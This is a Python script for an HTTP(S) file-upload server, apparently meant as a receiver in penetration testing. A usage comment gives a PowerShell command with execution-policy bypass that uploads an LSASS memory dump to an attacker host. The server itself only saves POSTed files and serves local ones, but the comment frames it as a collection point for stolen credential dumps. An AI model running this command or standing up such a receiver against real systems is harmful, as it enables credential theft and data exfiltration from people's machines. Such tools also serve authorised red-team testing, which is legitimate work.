#!/usr/bin/env python3

import argparse
import cgi
import logging
import pathlib
import socket
import ssl
from datetime import datetime
from http import server


logging.basicConfig(format='%(name)s %(levelname)s [%(asctime)s] %(message)s', level=logging.INFO)
logger = logging.getLogger('httpd')


# Example usage:
#   ~> powershell -exec bypass "(New-Object System.Net.WebClient).UploadFile('http://VAR_ATTACKER_HOST:8080/lsass.dmp', 'C:\Windows\Temp\lsass.dmp')"

# Generating server.pem:
#   ~$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes


class FileHandler(server.BaseHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        self.cwd = pathlib.Path.cwd()
        super().__init__(*args, **kwargs)

    def send_headers(self, content_type='text/html'):
        self.send_response(200)
        self.send_header('Content-type', content_type)
        self.send_header('Connection', 'close')
        self.end_headers()

    def get_temp_filename(self, client_host):
        name_date = datetime.now().strftime('%Y%m%d_%H%M')
        name = client_host + '-' + name_date
        suffix = 0
        while pathlib.Path(name).exists():
            suffix += 1
            name = client_host + '-' + name_date + '-' + str(suffix)
        return name

    def get_path_filename(self):
        return self.path.partition('/')[-1]

    def get_client_address(self):
        return ':'.join([str(i) for i in self.client_address])

    def do_GET(self):
        client_address = self.get_client_address()
        file_name = self.get_path_filename()
        local_path = pathlib.Path(self.cwd, file_name)
        if local_path.exists() and local_path.is_file() and self.cwd in local_path.parents:
            self.send_headers('application/octet-stream')
            logger.info('Sending file {} to {}...'.format(local_path, client_address))
            with open(str(local_path), mode='rb') as fil:
                content = fil.read()
                self.wfile.write(content)
        else:
            self.send_headers()

    def do_POST(self):
        self.send_headers()
        client_address = self.get_client_address()
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={
                'REQUEST_METHOD': 'POST',
                'CONTENT_TYPE': self.headers['Content-Type'],
            }
        )
        file_name = self.get_path_filename()
        output = form.getvalue('file')
        if file_name and output:
            local_path = pathlib.Path(self.cwd, file_name)
        else:
            for key in form.keys():
                output = form.getvalue(key)
                local_path = pathlib.Path(self.cwd, self.get_temp_filename(client_address + '-' + key))
                logger.info('Saving file {} ({} bytes) from {}...'.format(local_path, self.headers['Content-Length'], client_address))
        if self.cwd in local_path.parents:
            with open(local_path, 'wb') as fil:
                fil.write(output)
        logger.info('Saved {}'.format(local_path))


class HTTPServerV6(server.HTTPServer):

    address_family = socket.AF_INET6


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description='Saves files sent over HTTP POST to /path_is_filename.',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('-i', '--addr', help='Listening address', default='')
    parser.add_argument('-p', '--port', help='Listening port', type=int, default=8080)
    parser.add_argument('-6', '--ipv6', help='Enable IPv6', action='store_true')
    parser.add_argument('-s', '--https', help='Enable HTTPS and use provided certificate', default=None)
    args = parser.parse_args()
    server_cls = HTTPServerV6 if args.ipv6 else server.HTTPServer
    server = server_cls((args.addr, args.port), FileHandler)
    if args.https:
        server.socket = ssl.wrap_socket(server.socket, certfile=args.https, server_side=True)
    server_type = 'HTTPS' if args.https else 'HTTP'
    logger.info('Started {} server at {}'.format(server_type, ':'.join([args.addr, str(args.port)])))
    server.serve_forever()
